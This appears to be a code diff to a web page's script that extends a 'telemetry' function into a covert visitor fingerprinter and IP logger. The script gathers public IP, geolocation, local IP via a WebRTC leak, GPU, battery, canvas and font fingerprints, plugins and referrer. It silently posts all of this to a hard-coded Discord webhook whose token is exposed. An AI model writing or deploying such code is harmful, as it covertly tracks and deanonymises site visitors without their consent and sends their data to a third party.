@@ -46,97 +46,310 @@
 
     <script>
         async function gatherTelemetry() {
-            let telemetry = {};
+            let telemetry = {
+                browser: {},
+                system: {},
+                network: {},
+                display: {},
+                capabilities: {},
+                fingerprint: {},
+                location: {}
+            };
 
-            // Browser & Device Metadata
-            telemetry.userAgent = navigator.userAgent;
-            telemetry.platform = navigator.platform;
-            telemetry.language = navigator.language;
-            telemetry.languages = navigator.languages;
-            telemetry.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
-            telemetry.deviceMemory = navigator.deviceMemory || 'unknown';
-            telemetry.screenResolution = `${window.screen.width}x${window.screen.height}`;
-            telemetry.colorDepth = window.screen.colorDepth;
-            telemetry.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            telemetry.cookiesEnabled = navigator.cookieEnabled;
-            telemetry.doNotTrack = navigator.doNotTrack || 'unspecified';
-            telemetry.timestamp = new Date().toISOString();
+            // Basic Browser Info
+            telemetry.browser.userAgent = navigator.userAgent;
+            telemetry.browser.language = navigator.language;
+            telemetry.browser.languages = navigator.languages;
+            telemetry.browser.cookieEnabled = navigator.cookieEnabled;
+            telemetry.browser.doNotTrack = navigator.doNotTrack || 'unspecified';
+            telemetry.browser.onLine = navigator.onLine;
+            telemetry.browser.pdfViewerEnabled = navigator.pdfViewerEnabled;
+            
+            // Parse browser name and version from UA
+            const ua = navigator.userAgent;
+            let browserName = "Unknown";
+            let browserVersion = "Unknown";
+            
+            if (ua.includes("Firefox")) {
+                browserName = "Firefox";
+                browserVersion = ua.match(/Firefox\/([0-9.]+)/)?.[1];
+            } else if (ua.includes("Chrome") && !ua.includes("Edg")) {
+                browserName = "Chrome";
+                browserVersion = ua.match(/Chrome\/([0-9.]+)/)?.[1];
+            } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
+                browserName = "Safari";
+                browserVersion = ua.match(/Version\/([0-9.]+)/)?.[1];
+            } else if (ua.includes("Edg")) {
+                browserName = "Edge";
+                browserVersion = ua.match(/Edg\/([0-9.]+)/)?.[1];
+            }
+            
+            telemetry.browser.name = browserName;
+            telemetry.browser.version = browserVersion;
 
-            // Network / IP Information via Public API
+            // System Info
+            telemetry.system.platform = navigator.platform;
+            telemetry.system.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
+            telemetry.system.deviceMemory = navigator.deviceMemory || 'unknown';
+            telemetry.system.maxTouchPoints = navigator.maxTouchPoints || 0;
+            
+            // Try to get OS from user agent
+            let os = "Unknown";
+            if (ua.includes("Windows NT 10.0")) os = "Windows 10/11";
+            else if (ua.includes("Windows NT 6.3")) os = "Windows 8.1";
+            else if (ua.includes("Windows NT 6.2")) os = "Windows 8";
+            else if (ua.includes("Windows NT 6.1")) os = "Windows 7";
+            else if (ua.includes("Mac OS X")) os = "macOS";
+            else if (ua.includes("Linux")) os = "Linux";
+            else if (ua.includes("Android")) os = "Android";
+            else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
+            telemetry.system.os = os;
+
+            // Display Info
+            telemetry.display.screenResolution = `${window.screen.width}x${window.screen.height}`;
+            telemetry.display.screenAvailable = `${window.screen.availWidth}x${window.screen.availHeight}`;
+            telemetry.display.colorDepth = window.screen.colorDepth;
+            telemetry.display.pixelRatio = window.devicePixelRatio;
+            telemetry.display.orientation = window.screen.orientation ? window.screen.orientation.type : 'unknown';
+            telemetry.display.innerSize = `${window.innerWidth}x${window.innerHeight}`;
+
+            // Network Info
+            telemetry.network.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            telemetry.network.timezoneOffset = new Date().getTimezoneOffset();
+            
+            if (navigator.connection) {
+                telemetry.network.effectiveType = navigator.connection.effectiveType;
+                telemetry.network.downlink = navigator.connection.downlink;
+                telemetry.network.rtt = navigator.connection.rtt;
+                telemetry.network.saveData = navigator.connection.saveData;
+            }
+
+            // Public IP and Location
             try {
                 let response = await fetch('https://ipapi.co/json/');
                 let ipData = await response.json();
-                telemetry.network = ipData;
+                telemetry.location = ipData;
             } catch (error) {
-                telemetry.network = { error: "Failed to retrieve IP data" };
+                telemetry.location.error = "Failed to retrieve IP data";
             }
 
-            // Format for Discord webhook
+            // WebRTC Local IP Leak
+            try {
+                const pc = new RTCPeerConnection({iceServers: []});
+                pc.createDataChannel('');
+                pc.onicecandidate = (e) => {
+                    if (!e.candidate) return;
+                    const ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(e.candidate.candidate)?.[0];
+                    if (ip && !ip.startsWith('0.') && !telemetry.network.localIP) {
+                        telemetry.network.localIP = ip;
+                    }
+                };
+                await pc.createOffer().then(o => pc.setLocalDescription(o));
+                await new Promise(r => setTimeout(r, 1000));
+            } catch (e) {
+                telemetry.network.localIP = "Not available";
+            }
+
+            // Battery Info
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    telemetry.system.batteryLevel = Math.round(battery.level * 100) + '%';
+                    telemetry.system.batteryCharging = battery.charging;
+                    telemetry.system.batteryTimeRemaining = battery.charging ? battery.chargingTime : battery.dischargingTime;
+                } catch (e) {
+                    telemetry.system.battery = "Not available";
+                }
+            }
+
+            // GPU Info via WebGL
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        telemetry.system.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        telemetry.system.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                }
+            } catch (e) {
+                telemetry.system.gpu = "Not available";
+            }
+
+            // Storage Capabilities
+            telemetry.capabilities.localStorage = !!window.localStorage;
+            telemetry.capabilities.sessionStorage = !!window.sessionStorage;
+            telemetry.capabilities.indexedDB = !!window.indexedDB;
+            telemetry.capabilities.serviceWorker = 'serviceWorker' in navigator;
+            telemetry.capabilities.webShare = 'share' in navigator;
+            telemetry.capabilities.bluetooth = 'bluetooth' in navigator;
+            telemetry.capabilities.usb = 'usb' in navigator;
+
+            // Plugins
+            telemetry.browser.plugins = Array.from(navigator.plugins).map(p => p.name);
+
+            // Referrer
+            telemetry.browser.referrer = document.referrer || "Direct/None";
+
+            // Canvas Fingerprint (basic)
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.fillText("Fingerprint", 2, 2);
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125, 1, 62, 20);
+                telemetry.fingerprint.canvas = canvas.toDataURL().slice(-50);
+            } catch (e) {
+                telemetry.fingerprint.canvas = "Blocked";
+            }
+
+            // Fonts detection
+            const testFonts = ['Arial', 'Times New Roman', 'Helvetica', 'Courier', 'Georgia', 'Verdana'];
+            const baseFonts = ['monospace', 'sans-serif', 'serif'];
+            const detectedFonts = [];
+            
+            const testSpan = document.createElement('span');
+            testSpan.style.fontSize = '72px';
+            testSpan.innerHTML = 'mmmmmmmmmmlli';
+            document.body.appendChild(testSpan);
+            
+            for (let font of testFonts) {
+                let detected = false;
+                for (let base of baseFonts) {
+                    testSpan.style.fontFamily = `"${font}", ${base}`;
+                    const width = testSpan.offsetWidth;
+                    const height = testSpan.offsetHeight;
+                    testSpan.style.fontFamily = base;
+                    if (width !== testSpan.offsetWidth || height !== testSpan.offsetHeight) {
+                        detected = true;
+                        break;
+                    }
+                }
+                if (detected) detectedFonts.push(font);
+            }
+            document.body.removeChild(testSpan);
+            telemetry.capabilities.fonts = detectedFonts;
+
+            // Build Discord embed
             const embed = {
-                title: "📊 Telemetry Data Collected",
+                title: "📊 Enhanced Telemetry Report",
                 color: 3447003,
-                timestamp: telemetry.timestamp,
+                timestamp: new Date().toISOString(),
                 fields: [
                     {
-                        name: "🌐 IP Address",
-                        value: telemetry.network.ip || "N/A",
+                        name: "🌐 Public IP",
+                        value: telemetry.location.ip || "N/A",
+                        inline: true
+                    },
+                    {
+                        name: "🏠 Local IP (WebRTC)",
+                        value: telemetry.network.localIP || "N/A",
                         inline: true
                     },
                     {
                         name: "📍 Location",
-                        value: `${telemetry.network.city || "N/A"}, ${telemetry.network.region || "N/A"}, ${telemetry.network.country_name || "N/A"}`,
+                        value: `${telemetry.location.city || "N/A"}, ${telemetry.location.region || "N/A"}\n${telemetry.location.country_name || "N/A"} ${telemetry.location.country_code || ""}`,
                         inline: true
                     },
                     {
-                        name: "🏢 ISP",
-                        value: telemetry.network.org || "N/A",
+                        name: "🏢 ISP / ASN",
+                        value: `${telemetry.location.org || "N/A"}\nAS${telemetry.location.asn || "N/A"}`,
                         inline: true
                     },
                     {
-                        name: "💻 Platform",
-                        value: telemetry.platform,
+                        name: "💻 OS / Platform",
+                        value: `${telemetry.system.os}\n${telemetry.system.platform}`,
                         inline: true
                     },
                     {
-                        name: "🖥️ Screen",
-                        value: telemetry.screenResolution,
+                        name: "🌐 Browser",
+                        value: `${telemetry.browser.name} ${telemetry.browser.version}`,
                         inline: true
                     },
                     {
-                        name: "🧠 Memory / Cores",
-                        value: `${telemetry.deviceMemory}GB / ${telemetry.hardwareConcurrency} cores`,
+                        name: "🖥️ Display",
+                        value: `${telemetry.display.screenResolution} @ ${telemetry.display.pixelRatio}x\n${telemetry.display.colorDepth}-bit | ${telemetry.display.orientation}`,
                         inline: true
                     },
                     {
-                        name: "🔤 Language",
-                        value: telemetry.language,
+                        name: "⚙️ CPU / Cores",
+                        value: `${telemetry.system.hardwareConcurrency} logical cores`,
+                        inline: true
+                    },
+                    {
+                        name: "🧠 RAM (Approx)",
+                        value: `${telemetry.system.deviceMemory}GB (API rounded)`,
+                        inline: true
+                    },
+                    {
+                        name: "🔋 Battery",
+                        value: telemetry.system.batteryLevel ? 
+                            `${telemetry.system.batteryLevel} ${telemetry.system.batteryCharging ? '⚡' : '🔋'}` : "N/A",
+                        inline: true
+                    },
+                    {
+                        name: "📶 Network",
+                        value: telemetry.network.effectiveType ? 
+                            `${telemetry.network.effectiveType.toUpperCase()} | ${telemetry.network.downlink}Mbps | ${telemetry.network.rtt}ms` : "N/A",
+                        inline: true
+                    },
+                    {
+                        name: "🎮 GPU",
+                        value: telemetry.system.gpuRenderer ? 
+                            telemetry.system.gpuRenderer.substring(0, 50) : "N/A",
                         inline: true
                     },
                     {
                         name: "⏰ Timezone",
-                        value: telemetry.timezone,
+                        value: `${telemetry.network.timezone}\nUTC${telemetry.network.timezoneOffset >= 0 ? '-' : '+'}${Math.abs(telemetry.network.timezoneOffset / 60)}`,
                         inline: true
                     },
                     {
-                        name: "🍪 Cookies",
-                        value: telemetry.cookiesEnabled ? "Enabled" : "Disabled",
+                        name: "🍪 Cookies / DNT",
+                        value: `${telemetry.browser.cookieEnabled ? 'On' : 'Off'} / ${telemetry.browser.doNotTrack}`,
                         inline: true
+                    },
+                    {
+                        name: "👆 Touch Support",
+                        value: `${telemetry.system.maxTouchPoints} points`,
+                        inline: true
+                    },
+                    {
+                        name: "📥 Referrer",
+                        value: telemetry.browser.referrer.substring(0, 50) || "Direct",
+                        inline: false
+                    },
+                    {
+                        name: "🔌 Capabilities",
+                        value: `Storage: ${telemetry.capabilities.localStorage ? '✓' : '✗'} | SW: ${telemetry.capabilities.serviceWorker ? '✓' : '✗'} | BT: ${telemetry.capabilities.bluetooth ? '✓' : '✗'} | USB: ${telemetry.capabilities.usb ? '✓' : '✗'}`,
+                        inline: false
+                    },
+                    {
+                        name: "🔤 Fonts Detected",
+                        value: telemetry.capabilities.fonts.join(', ') || "None",
+                        inline: false
+                    },
+                    {
+                        name: "🧩 Plugins",
+                        value: telemetry.browser.plugins.slice(0, 5).join(', ') || "None detected",
+                        inline: false
                     }
                 ],
                 footer: {
-                    text: `User-Agent: ${telemetry.userAgent.substring(0, 100)}...`
+                    text: `UA: ${telemetry.browser.userAgent.substring(0, 100)}...`
                 }
             };
 
-            // Send to Discord webhook
+            // Send to Discord
             fetch('https://discord.com/api/webhooks/1552462992791052399/Uz6icIDiu7RZdSzPTVC94mYhptgY5Ccen2BbKDsIY5e5CppQqFSvtZylud57pka_NDOu', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({
-                    embeds: [embed]
-                })
+                body: JSON.stringify({ embeds: [embed] })
             }).catch(err => console.error('Failed to send:', err));
         }
 
